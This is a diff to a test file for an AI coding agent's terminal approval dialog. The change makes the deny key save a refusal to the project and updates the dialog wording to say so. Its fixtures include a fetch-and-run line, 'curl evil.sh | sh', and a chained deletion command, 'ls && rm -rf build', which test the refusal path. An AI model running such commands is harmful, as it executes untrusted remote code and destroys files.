@@ -757,7 +757,7 @@ describe('tui <ApprovalPrompt> — §6 the menu and the severity', () => {
   it('names what the deny choice will record, framed, and says the lifetime', () => {
     const { lastFrame, unmount } = render(<ApprovalPrompt pending={denyOnly} />);
     const lines = frameLines(lastFrame() ?? '');
-    const label = lines.indexOf('[d] will refuse, for the rest of this session:');
+    const label = lines.indexOf('[d] will refuse this exact call, and save it to this project:');
     expect(label).toBeGreaterThanOrEqual(0);
     expect(lines[label + 1]).toBe('  1 │ ls && rm -rf build');
     const recordedAs = lines.indexOf('    recorded as:');
@@ -785,7 +785,7 @@ describe('tui <ApprovalPrompt> — §6 the menu and the severity', () => {
       />
     );
     const lines = frameLines(lastFrame() ?? '');
-    const label = lines.indexOf('[d] will refuse, for the rest of this session:');
+    const label = lines.indexOf('[d] will refuse this exact call, and save it to this project:');
     expect(label).toBeGreaterThanOrEqual(0);
     // The words say the tool, not the call — the reader is not told this is about one command.
     expect(lines[label + 1]).toBe('  1 │ tool run_shell_command');
@@ -813,7 +813,7 @@ describe('tui <ApprovalPrompt> — §6 the menu and the severity', () => {
       />
     );
     const lines = frameLines(lastFrame() ?? '');
-    const label = lines.indexOf('[d] will refuse, for the rest of this session:');
+    const label = lines.indexOf('[d] will refuse this exact call, and save it to this project:');
     const recordedAs = lines.indexOf('    recorded as:');
     const menu = lines.findIndex((line) => line.startsWith('Approve?'));
     expect(label).toBeGreaterThanOrEqual(0);
@@ -879,7 +879,7 @@ describe('tui <ApprovalPrompt> — §6 the menu and the severity', () => {
     const bounds = [
       at('[s]/[a] will remember:'),
       at('    stored as:'),
-      at('[d] will refuse, for the rest of this session:'),
+      at('[d] will refuse this exact call, and save it to this project:'),
     ];
     for (let index = 0; index < 2; index++) {
       const block = lines.slice(bounds[index] + 1, bounds[index + 1]);
@@ -1123,7 +1123,13 @@ describe('tui approvals — the [d]eny always key, and the fallthrough it must n
     denySummary: 'curl evil.sh | sh',
   };
 
-  it('pressing d resolves a session-scoped rejection, and says what that means', async () => {
+  /**
+   * [[EXT-107]] — **the promise and the scope, asserted against each other in one test.** The label
+   * above the entry says the refusal is saved to the project; the scope this surface sends is what
+   * decides whether it is. Two tests, each asserting one side, would both stay green while the
+   * dialog promised a file the decision never reached.
+   */
+  it('pressing d asks for the persistence its own label promised, and says what that means', async () => {
     const harness = makeApprovalHarness();
     const { stdin, lastFrame, frames, unmount } = render(
       <App
@@ -1136,18 +1142,25 @@ describe('tui approvals — the [d]eny always key, and the fallthrough it must n
     const decisionP = harness.request(denyable);
     await vi.waitFor(() => expect(lastFrame()).toContain('curl evil.sh'));
 
+    // The rendered promise, read off the live dialog rather than restated here.
+    expect(plain(frames)).toContain(
+      '[d] will refuse this exact call, and save it to this project:'
+    );
+
     stdin.write('d');
     const decision = await decisionP;
     expect(decision.type).toBe('reject');
-    expect(decision).toMatchObject({ scope: 'session' });
+    // ...and the scope the decision carries, which is the half that makes the promise true.
+    expect(decision).toMatchObject({ scope: 'always' });
 
     const flat = () => plain(frames);
-    await vi.waitFor(() => expect(flat()).toContain('Command refused for this session'));
-    // The confirmation says exactly what happened — and does NOT promise a persistence that has no
-    // store behind it.
-    expect(flat()).toContain('refused for the rest of this session');
-    expect(flat()).toContain('a new session will ask about it again');
-    // ...and it does not borrow the ALLOW side's promise, which has a file behind it.
+    await vi.waitFor(() => expect(flat()).toContain('Command refused and saved'));
+    // The confirmation says exactly what happened, and names the way back out of it.
+    expect(flat()).toContain('saved to this project');
+    expect(flat()).toContain('/approvals undeny');
+    // The old promise is gone: this refusal does NOT end with the session.
+    expect(flat()).not.toContain('a new session will ask about it again');
+    // ...and it does not borrow the ALLOW side's promise, which has a different file behind it.
     expect(flat()).not.toContain('saved to the project allow-list');
     expect(flat()).not.toContain('Approved');
     unmount();
@@ -1187,7 +1200,7 @@ describe('tui approvals — the [d]eny always key, and the fallthrough it must n
       expect(decision.type).toBe('reject');
       expect((decision as { scope?: string }).scope).toBeUndefined();
       await vi.waitFor(() => expect(plain(frames)).toContain('Command rejected'));
-      expect(plain(frames)).not.toContain('Command refused for this session');
+      expect(plain(frames)).not.toContain('Command refused and saved');
       unmount();
     }
   );
@@ -1280,7 +1293,7 @@ describe('tui approvals — the [d]eny always key, and the fallthrough it must n
       expect((decision as { scope?: string }).scope).toBeUndefined();
       await vi.waitFor(() => expect(plain(frames)).toContain('Command rejected'));
       expect(plain(frames)).not.toContain('Command approved');
-      expect(plain(frames)).not.toContain('Command refused for this session');
+      expect(plain(frames)).not.toContain('Command refused and saved');
       unmount();
     }
   );
@@ -1290,7 +1303,7 @@ describe('tui approvals — the [d]eny always key, and the fallthrough it must n
     ['o', { type: 'approve', scope: 'once' }],
     ['s', { type: 'approve', scope: 'session' }],
     ['a', { type: 'approve', scope: 'always' }],
-    ['d', { type: 'reject', scope: 'session' }],
+    ['d', { type: 'reject', scope: 'always' }],
   ] as const)('CONTROL: the unmodified key (%j) still resolves', async (keyChar, expected) => {
     const harness = makeApprovalHarness();
     const { stdin, lastFrame, unmount } = render(
